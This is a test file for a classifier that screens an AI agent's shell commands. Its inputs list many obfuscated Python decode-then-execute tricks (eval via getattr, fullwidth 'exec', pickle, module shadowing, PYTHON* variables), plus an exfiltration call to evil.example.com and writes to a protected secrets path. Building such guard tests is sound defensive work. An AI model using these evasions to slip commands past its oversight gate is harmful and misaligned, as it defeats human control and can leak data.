import { describe, expect, test } from "bun:test";
import { join } from "path";
import { classifyToolCall, parseShellSnapshot, type FloorProbes, type ShellDefinitions } from "./classify.js";
import type { FloorConfig, FloorVerdict } from "./gate.js";

const HOME = join("/", "fake", "home");
const DATA = join(HOME, ".local", "share", "standup");
const ROOT = join(DATA, "worktrees", "standup", "feat-1");
const INSTALL = join("/", "fake", "install");
const COMMON = join("/", "fake", "repo", ".git");

const config: FloorConfig = {
  v: 1,
  collectorUrl: "http://127.0.0.1:17777",
  launchId: "launch-1",
  root: ROOT,
  sharedBranches: ["main", "mainline"],
  personalAwsAccounts: [],
  waitSeconds: 60,
  standupDataDir: DATA,
  floorPaths: [join(INSTALL, "packages", "collector", "src", "floor")],
  installDir: INSTALL,
  protectedPaths: [join(DATA, "secrets")],
  tmpDirs: ["/tmp"],
  workerToken: "x".repeat(64),
  replyPublicKey: "test",
};

const FILES: Record<string, string> = {
  [join(ROOT, ".git")]: `gitdir: ${COMMON}/worktrees/feat-1\n`,
  [join(ROOT, "package.json")]: JSON.stringify({ scripts: { test: "bun test" } }),
  ["/tmp/page.html"]: "<html><title>a &amp; b</title></html>\n",
};

function probes(extra: Record<string, string> = {}, env: Record<string, string> = {}): Partial<FloorProbes> {
  const files = { ...FILES, ...extra };
  const dirs = new Set<string>(["/", "/tmp", ROOT]);
  for (const f of Object.keys(files)) for (let d = f.slice(0, f.lastIndexOf("/")); d; d = d.slice(0, d.lastIndexOf("/"))) dirs.add(d);
  dirs.delete(join(ROOT, ".git"));
  const defs: ShellDefinitions = { aliases: new Map(), functions: new Map() };
  parseShellSnapshot("", defs);
  return {
    gitBranch: () => "standup/feat-1",
    gitAlias: () => null,
    gitHooksDir: () => null,
    gitCommonDir: (dir) => (dir === ROOT ? COMMON : null),
    readFile: (p) => (p in files ? { ok: true, text: files[p]! } : { ok: false, reason: "missing" }),
    exists: (p) => p in files || dirs.has(p),
    isDirectory: (p) => dirs.has(p),
    listDir: (p) => (dirs.has(p) ? [...new Set([...Object.keys(files), ...dirs].filter((f) => f.startsWith(`${p === "/" ? "" : p}/`)).map((f) => f.slice(p.length + 1).split("/")[0]!))] : null),
    realpath: (p) => (p in files || dirs.has(p) ? p : null),
    homeDir: () => HOME,
    shellDefinitions: () => defs,
    awsAccount: () => null,
    now: () => Date.now(),
    gitTree: () => null,
    gitAncestor: () => null,
    gitBlob: () => ({ ok: false, reason: "missing" }),
    env: (name) => (Object.hasOwn(env, name) ? env[name] : process.env[name]),
  };
}

function bash(command: string, cwd = ROOT, files: Record<string, string> = {}, env: Record<string, string> = {}): FloorVerdict {
  return classifyToolCall({ toolName: "Bash", toolInput: { command }, cwd }, config, probes(files, env));
}

function expectAllowed(v: FloorVerdict): void {
  expect(v).toEqual({ action: "allow" });
}

/*
 * Inline Python that decodes text and prints it. CODE_EXEC_SINK reads the
 * words of inline code's strings as calls (`runtime`, `call`, a backtick), so
 * a decoder next to such a string read as "decodes text and runs it". Code
 * whose every name, strings and comments included, reaches nothing that runs
 * text is read as running none; anything else is held as before.
 */

const EXTRACT = (pattern: string, decode = "html.unescape(m)") =>
  `python3 -I -c 'import re,sys,html; t=open(sys.argv[1]).read(); [print(${decode}) for m in re.findall(r"${pattern}", t)]' /tmp/page.html`;

describe("9. inline Python that decodes text and prints it", () => {
  test.each([
    EXTRACT(`<td class=\\"runtime\\">(.*?)</td>`),
    EXTRACT(`<p class=.call.>(.*?)</p>`),
    EXTRACT("<span>`(.*?)`</span>"),
    EXTRACT("<h3>Function (.*?)</h3>"),
    EXTRACT(`<td class=\\"runtime\\">(.*?)</td>`, `html.unescape(m).strip()`),
    `python3 -I -c 'import re,sys,html; t=open(sys.argv[1]).read(); print("\\n".join(html.unescape(m) for m in re.findall(r"<li class=.runner.>(.*?)</li>", t)))' /tmp/page.html`,
    `python3 -I -c 'import re,sys; from html import unescape; t=open(sys.argv[1]).read(); [print(unescape(m)) for m in re.findall(r"<td class=.runtime.>(.*?)</td>", t)]' /tmp/page.html`,
    `python3 -I -c 'import sys, json, html; d=json.load(open(sys.argv[1])); print(html.unescape(d["runtime"]))' /tmp/page.html`,
    `python3 -I -c 'import sys; from urllib.parse import unquote; [print(unquote(a)) for a in sys.argv[1:]]' 'run%20me' called`,
    `python3 -Ic 'import re,sys,html; t=open(sys.argv[1]).read(); [print(html.unescape(m)) for m in re.findall(r"<td class=.runtime.>(.*?)</td>", t)]' /tmp/page.html`,
    `python3 -c 'import re,sys,html; t=open(sys.argv[1]).read(); [print(html.unescape(m)) for m in re.findall(r"<td class=.runtime.>(.*?)</td>", t)]' /tmp/page.html`,
  ])("allows %p", (command) => {
    expectAllowed(bash(command));
  });

  // Reached without a call CODE_EXEC_SINK reads.
  test.each([
    `python3 -I -c 'import html; getattr(__builtins__, "ev"+"al")(html.unescape("x"))'`,
    `python3 -I -c 'import html; vars(__builtins__)["ev"+"al"](html.unescape("x"))'`,
    `python3 -I -c 'import html; ｅｘｅｃ(html.unescape("x"))'`,
    `python3 -I -c 'import html, pickle; pickle.loads(html.unescape("x").encode())'`,
    `python3 -I -c 'import html; help(html.unescape("x"))'`,
  ])("holds %p as decoding and running text", (command) => {
    expect(bash(command)).toMatchObject({ action: "hold", reason: expect.stringContaining("decodes or assembles text and runs it") });
  });

  test("the reported command was already allowed and stays allowed", () => {
    expectAllowed(bash(EXTRACT("<title>(.*?)</title>")));
  });

  // Real decode-then-run, and every way of reaching a runner without its name in plain sight.
  test.each([
    `python3 -c 'import base64; exec(base64.b64decode("cHJpbnQoMSk="))'`,
    `python3 -c 'import html,os; os.system(html.unescape("git push"))'`,
    `python3 -I -c 'import html,sys; eval(html.unescape(open(sys.argv[1]).read()))' /tmp/page.html`,
    `python3 -I -c 'import html,sys; exec(html.unescape(open(sys.argv[1]).read()))' /tmp/page.html`,
    `python3 -I -c 'import html; getattr(__builtins__, "ev"+"al")(html.unescape("x"))'`,
    `python3 -I -c 'import html; getattr(__builtins__, html.unescape("&#101;val"))(html.unescape("x"))'`,
    `python3 -I -c 'import html; __import__("o"+"s").system(html.unescape("git push"))'`,
    `python3 -I -c 'import html; globals()["__builtins__"].eval(html.unescape("x"))'`,
    `python3 -I -c 'import html; vars(__builtins__)["ev"+"al"](html.unescape("x"))'`,
    `python3 -I -c 'import html, sys; sys.modules["o"+"s"].system(html.unescape("git push"))'`,
    `python3 -I -c 'import html; ｅｘｅｃ(html.unescape("x"))'`,
    `python3 -I -c 'import html; ｅval(html.unescape("x"))'`,
    `python3 -I -c 'import html; e=eval; e(html.unescape("x"))'`,
    `python3 -I -c 'import html; type(lambda:0)(compile(html.unescape("x"),"","exec"),{})()'`,
    `python3 -I -c 'import html, importlib; importlib.import_module(html.unescape("os")).system("x")'`,
    `python3 -I -c 'import html, subprocess; subprocess.run(html.unescape("git push"), shell=True)'`,
    `python3 -I -c 'import html, pickle; pickle.loads(html.unescape("x").encode())'`,
    `python3 -I -c 'import html, runpy; runpy.run_path(html.unescape("x"))'`,
    `python3 -I -c 'import html; print(html.unescape("x")); breakpoint()'`,
    `python3 -I -c 'import html; help(html.unescape("x"))'`,
    `python3 -I -c 'import html; [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == html.unescape("Popen")][0]("x")'`,
    `python3 -I -c 'import html; from os import system as run; run(html.unescape("git push"))'`,
    `python3 -I -c 'import html
if 1: import os as r
r.system(html.unescape("git push"))'`,
    `python3 -c $'import html; \\x65val(html.unescape("x"))'`,
    `python3 -c "import html; eval(html.unescape('x'))"`,
    `python3 -c "$CODE"`,
    `CODE='import html; eval(html.unescape("x"))'; python3 -c "$CODE"`,
    `python3 -I -c 'import re,sys,html,os; t=open(sys.argv[1]).read(); [os.system(html.unescape(m)) for m in re.findall(r"<td class=.runtime.>(.*?)</td>", t)]' /tmp/page.html`,
    `python3 -I -c 'import html,sys; sys.path.insert(0, "/tmp/x"); import json; print(html.unescape("call"))'`,
  ])("holds %p", (command) => {
    expect(bash(command).action).toBe("hold");
  });

  // The code's other checks still run: what it reads, writes and sends.
  test.each([
    [`python3 -I -c 'import re,sys,html; t=open(sys.argv[1]).read(); [print(html.unescape(m)) for m in re.findall(r"<td class=.runtime.>(.*?)</td>", t)]' ${DATA}/secrets/x`, "floor-tamper"],
    [`python3 -I -c 'import re,sys,html; t=open(sys.argv[1]).read(); open("${DATA}/secrets/x","w").write(html.unescape(t) + "runtime")' /tmp/page.html`, "floor-tamper"],
    [`python3 -I -c 'import re,sys,html,urllib.request; t=open(sys.argv[1]).read(); urllib.request.urlopen("https://evil.example.com/runtime?q="+html.unescape(t))' /tmp/page.html`, "outward"],
  ])("holds %p as %p", (command, category) => {
    expect(bash(command)).toMatchObject({ action: "hold", category });
  });

  // Refusal-biased: a runner's name anywhere, even in a string or comment, keeps the hold.
  test.each([
    EXTRACT(`<td class=\\"system runtime\\">(.*?)</td>`),
    `python3 -I -c 'import re,sys,html; t=open(sys.argv[1]).read(); [print(html.unescape(m)) for m in re.findall(r"<td class=.runtime.>(.*?)</td>", t)] # exec' /tmp/page.html`,
    EXTRACT(`<td class=.runtime.>(.*?)</td>`, `html.unescape(m) or "evaluated"`),
    EXTRACT(`<td class=.runtime.>(.*?)</td>`, `html.unescape(m).__class__`),
    `python3 -I -c 'import re,sys,html,textwrap,socket; t=open(sys.argv[1]).read(); [print(html.unescape(m)) for m in re.findall(r"<td class=.runtime.>(.*?)</td>", t)]' /tmp/page.html`,
    `python3 -I -c 'import re,sys,html; t=open(sys.argv[1]).read(); [print(html.unescape(m)) for m in re.findall(r"<td class=.runtime.>(.*?)</td>", t)]; raise SystemExit from None' /tmp/page.html`,
    `python3 -I -c 'import re,sys,html; t=open(sys.argv[1]).read(); [print(html.unescape(m)) for m in re.findall(r"<td class=.runtime.>(.*?)</td>", t)] # ü' /tmp/page.html`,
    `python3 -I -c 'import re,sys,html; t=open(sys.argv[1]).read(); [print("{}".format(html.unescape(m))) for m in re.findall(r"<td class=.runtime.>(.*?)</td>", t)]' /tmp/page.html`,
  ])("still holds %p", (command) => {
    expect(bash(command)).toMatchObject({ action: "hold", category: "unclassified" });
  });

  test.each([
    [`node -e 'console.log(unescape(require("fs").readFileSync(process.argv[1],"utf8")).match(/runtime/))' /tmp/page.html`, "hold"],
    [`ruby -e 'require "cgi"; puts CGI.unescapeHTML(File.read(ARGV[0])).sub("runtime", "")' /tmp/page.html`, "hold"],
    [`perl -e 'print chr(65) . "runtime"'`, "hold"],
    [`python3 -m json.tool /tmp/page.html`, "allow"],
    [`sh -c 'python3 -c "import html; print(html.unescape(\\"&#96;runtime&#96;\\"))"'`, "allow"],
  ])("only Python inline code is read this way: %p", (command, action) => {
    expect(bash(command)).toMatchObject({ action });
  });

  // Python 2's input() evaluates what it reads, and `python`, `python2` and `pypy` may be Python 2.
  test.each(["python", "python2", "python2.7", "pypy", "/usr/bin/python"])("holds the decode-and-print code run by %p", (interpreter) => {
    expect(bash(EXTRACT(`<td class=.runtime.>(.*?)</td>`).replace(/^python3/, interpreter)).action).toBe("hold");
  });

  test.each(["python3", "python3.11", "/usr/bin/python3"])("allows the decode-and-print code run by %p", (interpreter) => {
    expectAllowed(bash(EXTRACT(`<td class=.runtime.>(.*?)</td>`).replace(/^python3/, interpreter)));
  });

  test("holds decoded text printed beside input()", () => {
    expect(bash(`python3 -I -c 'import html; print(html.unescape(input()), "runtime")'`)).toMatchObject({ action: "hold", category: "unclassified" });
  });

  // Decoded text written to a file a later step runs is text the command runs.
  test.each([
    `python3 -I -c 'import base64; open("/tmp/run.sh","w").write(base64.b64decode("ZWNobyBoaQ==").decode())' && sh /tmp/run.sh`,
    `python3 -I -c 'import base64; open("/tmp/run.sh", mode="a").write(base64.b64decode("ZWNobyBoaQ==").decode())' && sh /tmp/run.sh`,
    `python3 -I -c 'import base64; f = open; f("/tmp/run.sh","w").write(base64.b64decode("ZWNobyBoaQ==").decode())' && sh /tmp/run.sh`,
    `python3 -I -c 'import base64, codecs; codecs.open("/tmp/run.sh","w").write(base64.b64decode("ZWNobyBoaQ==").decode())' && sh /tmp/run.sh`,
    `python3 -I -c 'import re,sys,html; t=open(sys.argv[1]).read(); open("/tmp/run.sh","w").write("\\n".join(html.unescape(m) for m in re.findall(r"<td class=.runtime.>(.*?)</td>", t)))' /tmp/page.html && sh /tmp/run.sh`,
    `python3 -I -c 'import re,sys,html; t=open(sys.argv[1]).read(); print(html.unescape(t), file=open("/tmp/run.sh", "x"))' /tmp/page.html && sh /tmp/run.sh`,
  ])("holds %p", (command) => {
    expect(bash(command).action).toBe("hold");
  });

  test("decode-and-print code that only reads its file is still allowed", () => {
    expectAllowed(bash(`python3 -I -c 'import re,sys,html; t=open(sys.argv[1], "r").read(); [print(html.unescape(m)) for m in re.findall(r"<td class=.runtime.>(.*?)</td>", t)]' /tmp/page.html`));
  });

  test("a node one-liner that decodes beside a word read as a call still holds", () => {
    expect(bash(`node -e 'console.log(unescape(require("fs").readFileSync(process.argv[1],"utf8")).match(/runtime/))' /tmp/page.html`).action).toBe("hold");
  });

  /*
   * The code is read as running no text only when the modules it imports are
   * the standard library's. `python3 -c` searches the working dir first
   * (unless `-I` or `-P`), and PYTHON* variables (unless `-I` or `-E`) or
   * `-i` run more code than the command's.
   */
  const RUNTIME = EXTRACT(`<td class=.runtime.>(.*?)</td>`);
  const BARE = RUNTIME.replace(/^python3 -I -c/, "python3 -c");
  const SHADOWS: Array<[string, Record<string, string>]> = [
    ["re.py", { [join(ROOT, "re.py")]: "x = 1\n" }],
    ["a compiled html module", { [join(ROOT, "html.cpython-312-x86_64-linux-gnu.so")]: "" }],
    ["a json package", { [join(ROOT, "json", "__init__.py")]: "x = 1\n" }],
    ["an html dir", { [join(ROOT, "html", "notes.txt")]: "x\n" }],
    ["enum.py, which re imports", { [join(ROOT, "enum.py")]: "x = 1\n" }],
    ["a package another module may import", { [join(ROOT, "tokenize", "__init__.pyc")]: "" }],
  ];
  test("with nothing importable in the working dir, the code run without -I is allowed", () => {
    expect(BARE).toStartWith("python3 -c 'import re");
    expectAllowed(bash(BARE));
    expectAllowed(bash(BARE, ROOT, { [join(ROOT, "src", "app.ts")]: "x\n", [join(ROOT, "README.md")]: "x\n" }));
  });
  test.each(SHADOWS)("holds the code run without -I beside %p in the working dir", (_what, files) => {
    expect(bash(BARE, ROOT, files)).toMatchObject({ action: "hold", category: "unclassified" });
  });
  test.each(SHADOWS)("allows the code run with -I or -P beside %p", (_what, files) => {
    expectAllowed(bash(RUNTIME, ROOT, files));
    expectAllowed(bash(RUNTIME.replace(/^python3 -I -c/, "python3 -P -c"), ROOT, files));
  });
  test("holds the code run in a working dir the floor can't list", () => {
    expect(bash(`cd "$(cat /tmp/d)" && ${BARE}`).action).toBe("hold");
  });

  test.each([
    ["-i", RUNTIME.replace(/^python3 -I -c/, "python3 -I -i -c")],
    ["-i grouped", RUNTIME.replace(/^python3 -I -c/, "python3 -Iic")],
    ["-W", RUNTIME.replace(/^python3 -I -c/, "python3 -I -W ignore::mod.Warn -c")],
    ["-X presite", RUNTIME.replace(/^python3 -I -c/, "python3 -I -X presite=mod -c")],
    // getopt reads the rest of a group after `W` or `X` as that option's value.
    ["-W in a group", RUNTIME.replace(/^python3 -I -c/, "python3 -I -bWignore::mod.Warn -c")],
    ["-X in a group", RUNTIME.replace(/^python3 -I -c/, "python3 -I -bXpresite=mod -c")],
    ["-i in a group ending in -X", RUNTIME.replace(/^python3 -I -c/, "python3 -I -ibXdev -c")],
    ["PYTHONINSPECT", `PYTHONINSPECT=1 ${BARE}`],
    ["PYTHONSTARTUP", `PYTHONSTARTUP=/tmp/s.py ${BARE}`],
    ["PYTHONPATH exported", `export PYTHONPATH=/tmp/x; ${BARE}`],
    ["PYTHONPATH under -P", `PYTHONPATH=/tmp/x ${RUNTIME.replace(/^python3 -I -c/, "python3 -P -c")}`],
    ["a name exported the floor can't read", `export "$(cat /tmp/n)=1"; ${BARE}`],
  ])("holds the code run with %p", (_what, command) => {
    expect(bash(command)).toMatchObject({ action: "hold", category: "unclassified" });
  });
  test.each(["PYTHONPATH", "PYTHONSTARTUP", "PYTHONINSPECT", "PYTHONHOME"])("holds the code run without -I or -E under an inherited %p", (name) => {
    expect(bash(BARE, ROOT, {}, { [name]: "/tmp/x" })).toMatchObject({ action: "hold", category: "unclassified" });
    expect(bash(RUNTIME.replace(/^python3 -I -c/, "python3 -P -c"), ROOT, {}, { [name]: "/tmp/x" })).toMatchObject({ action: "hold", category: "unclassified" });
  });
  // `-I` and `-E` ignore every PYTHON* variable.
  test("allows the code run with -I or -E under an inherited PYTHONPATH or a command's PYTHONINSPECT", () => {
    expectAllowed(bash(RUNTIME, ROOT, {}, { PYTHONPATH: "/tmp/x" }));
    expectAllowed(bash(`PYTHONINSPECT=1 ${RUNTIME}`));
    expectAllowed(bash(RUNTIME.replace(/^python3 -I -c/, "python3 -E -c"), ROOT, {}, { PYTHONSTARTUP: "/tmp/s.py" }));
  });

  // An import after a `;` loads the module it names from the working dir as much as one starting a line.
  test.each([
    `python3 -c 'import sys; import helper; print(sys.argv)'`,
    `python3 -c 'import sys;import helper'`,
    `python3 -c 'import sys; from helper import go'`,
    `python3 -c 'if True: import helper'`,
  ])("follows the import in %p", (command) => {
    expect(bash(command, ROOT, { [join(ROOT, "helper.py")]: `open("${DATA}/secrets/x", "w").write("1")\n` })).toMatchObject({ action: "hold", category: "floor-tamper" });
  });

  // A module this same command writes into the working dir is there when the code imports it.
  test.each([
    ["re.py", `printf 'x = 1\\n' > re.py && ${BARE}`],
    ["a json package", `mkdir json && printf 'x = 1\\n' > json/__init__.py && ${BARE}`],
    ["enum.py, copied in", `cp /tmp/e.py enum.py && ${BARE}`],
  ])("holds the code run without -I after the command writes %p in the working dir", (_what, command) => {
    expect(bash(command, ROOT, { "/tmp/e.py": "x = 1\n" })).toMatchObject({ action: "hold", category: "unclassified" });
  });
  // Decoding into a named runner holds.
  test.each([
    `python3 -c 'import base64; exec(base64.b64decode("cHJpbnQoMSk="))'`,
    `python3 -c 'import html,os; os.system(html.unescape("git push"))'`,
    `python3 -I -c 'import html; __import__("o"+"s").system(html.unescape("git push"))'`,
    `python3 -I -c 'import html; globals()["__builtins__"].eval(html.unescape("x"))'`,
    `python3 -c "$CODE"`,
  ])("holds %p", (command) => {
    expect(bash(command).action).toBe("hold");
  });
});
